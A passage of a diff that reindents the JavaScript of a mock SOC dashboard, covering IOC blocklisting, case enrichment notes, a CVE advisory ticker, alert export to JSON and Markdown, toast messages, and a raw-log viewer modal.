+                    if (active) {
+                        active.notes.unshift({
+                            ts: nowTs,
+                            author: "CTI Sandbox",
+                            text: `Indicator [${ioc}] pushed to Palo Alto EDL Blocklist.`
+                        });
+                        renderDrawerNotes(active);
+                    }
                 }
+                renderSiemTable();
+                updateSidebarBlocklist();
+                showSocToast(`Indicator [${ioc}] added to Edge Firewall EDL Blocklist`, "warning");
+            }
 
-                function attachIocToActiveCase(ioc, verdict, score) {
-                    const alert = alertsData.find(a => a.id === selectedAlertId);
-                    if (!alert) return;
-                    const nowTs = new Date().toISOString().substring(11, 19) + " UTC";
-                    alert.notes.unshift({
-                        ts: nowTs,
-                        author: "CTI Enrichment",
-                        text: `Attached IOC [${ioc}] — Verdict: ${verdict} (Risk Score: ${score}/100).`
-                    });
-                    renderDrawerNotes(alert);
-                    appendTerminalLine(nowTs, "CTI_ATTACH",
-                        `Enrichment for ${ioc} (Score ${score}) linked to ${alert.id}`, "term-ok");
-                    showSocToast(`Attached IOC intel to case ${alert.id}`, "info");
-                }
+            function attachIocToActiveCase(ioc, verdict, score) {
+                const alert = alertsData.find(a => a.id === selectedAlertId);
+                if (!alert) return;
+                const nowTs = new Date().toISOString().substring(11, 19) + " UTC";
+                alert.notes.unshift({
+                    ts: nowTs,
+                    author: "CTI Enrichment",
+                    text: `Attached IOC [${ioc}] — Verdict: ${verdict} (Risk Score: ${score}/100).`
+                });
+                renderDrawerNotes(alert);
+                appendTerminalLine(nowTs, "CTI_ATTACH",
+                    `Enrichment for ${ioc} (Score ${score}) linked to ${alert.id}`, "term-ok");
+                showSocToast(`Attached IOC intel to case ${alert.id}`, "info");
+            }
 
-                /********************************************************************
-                 * 8. LIVE SECURITY ADVISORY TICKER & CISA KEV TAB
-                 ********************************************************************/
-                function renderAdvisoryTicker() {
-                    const ticker = document.getElementById("advisoryTickerContent");
-                    const itemsHtml = advisoriesData.map(adv => `
+            /********************************************************************
+             * 8. LIVE SECURITY ADVISORY TICKER & CISA KEV TAB
+             ********************************************************************/
+            function renderAdvisoryTicker() {
+                const ticker = document.getElementById("advisoryTickerContent");
+                const itemsHtml = advisoriesData.map(adv => `
       <span>
         <strong class="text-warning">[${adv.cve}]</strong> ${adv.title} (CVSS ${adv.cvss}) — <span class="text-info">${adv.dueDate}</span>
       </span>
     `).join("");
-                    // Duplicate for seamless infinite scroll
-                    ticker.innerHTML = itemsHtml + itemsHtml;
-                }
+                // Duplicate for seamless infinite scroll
+                ticker.innerHTML = itemsHtml + itemsHtml;
+            }
 
-                function renderAdvisoriesTab() {
-                    const grid = document.getElementById("advisoriesGrid");
-                    grid.innerHTML = advisoriesData.map(adv => `
+            function renderAdvisoriesTab() {
+                const grid = document.getElementById("advisoriesGrid");
+                grid.innerHTML = advisoriesData.map(adv => `
       <div class="col-12 col-lg-6">
         <div class="soc-card p-3 h-100 d-flex flex-column justify-content-between">
           <div>
@@ -2238,63 +2233,63 @@
         </div>
       </div>
     `).join("");
+            }
+
+            function SweepSiemForAdvisory(cve, iocMatch) {
+                const matches = alertsData.filter(a => a.cve === cve || a.srcIp === iocMatch || a.hostname ===
+                    iocMatch);
+                if (matches.length > 0) {
+                    switchWorkspaceTab("tab-siem");
+                    document.getElementById("siemSearchInput").value = cve !== "N/A" ? cve : iocMatch;
+                    renderSiemTable();
+                    selectAlert(matches[0].id);
+                    showSocToast(`ALERT: Found ${matches.length} local SIEM match(es) for ${cve}!`, "danger");
+                } else {
+                    showSocToast(`Sweep Complete: 0 local SIEM assets matched indicators for ${cve}.`,
+                        "success");
                 }
+            }
 
-                function SweepSiemForAdvisory(cve, iocMatch) {
-                    const matches = alertsData.filter(a => a.cve === cve || a.srcIp === iocMatch || a.hostname ===
-                        iocMatch);
-                    if (matches.length > 0) {
-                        switchWorkspaceTab("tab-siem");
-                        document.getElementById("siemSearchInput").value = cve !== "N/A" ? cve : iocMatch;
-                        renderSiemTable();
-                        selectAlert(matches[0].id);
-                        showSocToast(`ALERT: Found ${matches.length} local SIEM match(es) for ${cve}!`, "danger");
-                    } else {
-                        showSocToast(`Sweep Complete: 0 local SIEM assets matched indicators for ${cve}.`,
-                            "success");
-                    }
+            /********************************************************************
+             * 9. CLIPBOARD & MARKDOWN INCIDENT REPORT EXPORT UTILITIES
+             ********************************************************************/
+            function copyTextToClipboard(text, toastMsg) {
+                const ta = document.createElement("textarea");
+                ta.value = text;
+                ta.style.position = "fixed";
+                ta.style.opacity = "0";
+                document.body.appendChild(ta);
+                ta.select();
+                try {
+                    document.execCommand("copy");
+                    showSocToast(toastMsg, "info");
+                } catch (err) {
+                    showSocToast("Clipboard copy failed", "danger");
                 }
+                document.body.removeChild(ta);
+            }
 
-                /********************************************************************
-                 * 9. CLIPBOARD & MARKDOWN INCIDENT REPORT EXPORT UTILITIES
-                 ********************************************************************/
-                function copyTextToClipboard(text, toastMsg) {
-                    const ta = document.createElement("textarea");
-                    ta.value = text;
-                    ta.style.position = "fixed";
-                    ta.style.opacity = "0";
-                    document.body.appendChild(ta);
-                    ta.select();
-                    try {
-                        document.execCommand("copy");
-                        showSocToast(toastMsg, "info");
-                    } catch (err) {
-                        showSocToast("Clipboard copy failed", "danger");
-                    }
-                    document.body.removeChild(ta);
-                }
+            function copyAlertJsonById(alertId) {
+                const alert = alertsData.find(a => a.id === alertId);
+                if (!alert) return;
+                copyTextToClipboard(JSON.stringify(alert.rawLog, null, 2),
+                    `Copied raw CEF/JSON payload for ${alert.id}`);
+            }
 
-                function copyAlertJsonById(alertId) {
-                    const alert = alertsData.find(a => a.id === alertId);
-                    if (!alert) return;
-                    copyTextToClipboard(JSON.stringify(alert.rawLog, null, 2),
-                        `Copied raw CEF/JSON payload for ${alert.id}`);
-                }
+            function copyRawPayloadFromDrawer() {
+                copyAlertJsonById(selectedAlertId);
+            }
 
-                function copyRawPayloadFromDrawer() {
-                    copyAlertJsonById(selectedAlertId);
-                }
+            function exportAllAlertsJson() {
+                copyTextToClipboard(JSON.stringify(alertsData, null, 2),
+                    `Copied all ${alertsData.length} queue alerts as JSON to clipboard`);
+            }
 
-                function exportAllAlertsJson() {
-                    copyTextToClipboard(JSON.stringify(alertsData, null, 2),
-                        `Copied all ${alertsData.length} queue alerts as JSON to clipboard`);
-                }
+            function exportIncidentMarkdown() {
+                const alert = alertsData.find(a => a.id === selectedAlertId);
+                if (!alert) return;
 
-                function exportIncidentMarkdown() {
-                    const alert = alertsData.find(a => a.id === selectedAlertId);
-                    if (!alert) return;
-
-                    const md = `# SOC INCIDENT INVESTIGATION REPORT // ${alert.id}
+                const md = `# SOC INCIDENT INVESTIGATION REPORT // ${alert.id}
 - **Detection Title:** ${alert.title}
 - **Severity:** ${alert.severity}
 - **Incident Status:** ${alert.status}
@@ -2320,97 +2315,97 @@ ${JSON.stringify(alert.rawLog, null, 2)}
 \`\`\`
 `;
 
-                    // Copy to clipboard AND trigger file download
-                    copyTextToClipboard(md, `Incident Report ${alert.id}.md copied & downloaded!`);
-                    const blob = new Blob([md], {
-                        type: "text/markdown;charset=utf-8;"
-                    });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement("a");
-                    a.href = url;
-                    a.download = `${alert.id}-Incident-Report.md`;
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                    URL.revokeObjectURL(url);
-                }
+                // Copy to clipboard AND trigger file download
+                copyTextToClipboard(md, `Incident Report ${alert.id}.md copied & downloaded!`);
+                const blob = new Blob([md], {
+                    type: "text/markdown;charset=utf-8;"
+                });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement("a");
+                a.href = url;
+                a.download = `${alert.id}-Incident-Report.md`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }
 
-                function showSocToast(message, variant = "info") {
-                    const container = document.getElementById("socToastContainer");
-                    const borderColors = {
-                        info: "#38bdf8",
-                        danger: "#ef4444",
-                        warning: "#eab308",
-                        success: "#10b981"
-                    };
-                    const toastEl = document.createElement("div");
-                    toastEl.className = "toast show align-items-center border-0 mb-2 shadow";
-                    toastEl.style.background = "var(--soc-bg-surface)";
-                    toastEl.style.color = "var(--soc-text-primary)";
-                    toastEl.style.borderLeft = `4px solid ${borderColors[variant] || "#38bdf8"}`;
+            function showSocToast(message, variant = "info") {
+                const container = document.getElementById("socToastContainer");
+                const borderColors = {
+                    info: "#38bdf8",
+                    danger: "#ef4444",
+                    warning: "#eab308",
+                    success: "#10b981"
+                };
+                const toastEl = document.createElement("div");
+                toastEl.className = "toast show align-items-center border-0 mb-2 shadow";
+                toastEl.style.background = "var(--soc-bg-surface)";
+                toastEl.style.color = "var(--soc-text-primary)";
+                toastEl.style.borderLeft = `4px solid ${borderColors[variant] || "#38bdf8"}`;
 
-                    toastEl.innerHTML = `
+                toastEl.innerHTML = `
       <div class="d-flex">
         <div class="toast-body mono small">${message}</div>
         <button type="button" class="btn-close btn-close-white me-2 m-auto" onclick="this.closest('.toast').remove()"></button>
       </div>
     `;
-                    container.appendChild(toastEl);
-                    setTimeout(() => {
-                        if (toastEl.parentNode) toastEl.remove();
-                    }, 3600);
-                }
+                container.appendChild(toastEl);
+                setTimeout(() => {
+                    if (toastEl.parentNode) toastEl.remove();
+                }, 3600);
+            }
 
-                /********************************************************************
-                 * 10. RAW LOG VIEWER MODAL
-                 ********************************************************************/
-                function syntaxHighlight(json) {
-                    if (typeof json != 'string') {
-                        json = JSON.stringify(json, undefined, 2);
-                    }
-                    json = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-                    return json.replace(
-                        /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g,
-                        function (match) {
-                            var cls = 'json-number';
-                            if (/^"/.test(match)) {
-                                if (/:$/.test(match)) {
-                                    cls = 'json-key';
-                                } else {
-                                    cls = 'json-string';
-                                }
-                            } else if (/true|false/.test(match)) {
-                                cls = 'json-boolean';
-                            } else if (/null/.test(match)) {
-                                cls = 'json-null';
+            /********************************************************************
+             * 10. RAW LOG VIEWER MODAL
+             ********************************************************************/
+            function syntaxHighlight(json) {
+                if (typeof json != 'string') {
+                    json = JSON.stringify(json, undefined, 2);
+                }
+                json = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+                return json.replace(
+                    /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g,
+                    function (match) {
+                        var cls = 'json-number';
+                        if (/^"/.test(match)) {
+                            if (/:$/.test(match)) {
+                                cls = 'json-key';
+                            } else {
+                                cls = 'json-string';
                             }
-                            return '<span class="' + cls + '">' + match + '</span>';
-                        });
-                }
+                        } else if (/true|false/.test(match)) {
+                            cls = 'json-boolean';
+                        } else if (/null/.test(match)) {
+                            cls = 'json-null';
+                        }
+                        return '<span class="' + cls + '">' + match + '</span>';
+                    });
+            }
 
-                function viewRawLog(alertId) {
-                    const alert = alertsData.find(a => a.id === alertId);
-                    if (!alert) return;
+            function viewRawLog(alertId) {
+                const alert = alertsData.find(a => a.id === alertId);
+                if (!alert) return;
 
-                    // Set Modal Header
-                    document.getElementById("rawLogModalTitle").innerHTML = `
+                // Set Modal Header
+                document.getElementById("rawLogModalTitle").innerHTML = `
       <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="me-1"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
       Raw Telemetry: <span class="text-white">${alert.id}</span>
     `;
 
-                    // Highlight and set JSON body
-                    const jsonStr = JSON.stringify(alert.rawLog, null, 2);
-                    document.getElementById("rawLogModalBody").innerHTML = syntaxHighlight(jsonStr);
+                // Highlight and set JSON body
+                const jsonStr = JSON.stringify(alert.rawLog, null, 2);
+                document.getElementById("rawLogModalBody").innerHTML = syntaxHighlight(jsonStr);
 
-                    // Hook up copy button specifically for this payload
-                    const copyBtn = document.getElementById("rawLogModalCopyBtn");
-                    copyBtn.onclick = () => copyAlertJsonById(alert.id);
+                // Hook up copy button specifically for this payload
+                const copyBtn = document.getElementById("rawLogModalCopyBtn");
+                copyBtn.onclick = () => copyAlertJsonById(alert.id);
 
-                    // Show Bootstrap Modal
-                    const rawLogModal = new bootstrap.Modal(document.getElementById('rawLogModal'));
-                    rawLogModal.show();
-                }
-            </script>
+                // Show Bootstrap Modal
+                const rawLogModal = new bootstrap.Modal(document.getElementById('rawLogModal'));
+                rawLogModal.show();
+            }
+        </script>
     </main>
 
     <!-- ==== FOOTER ==== -->
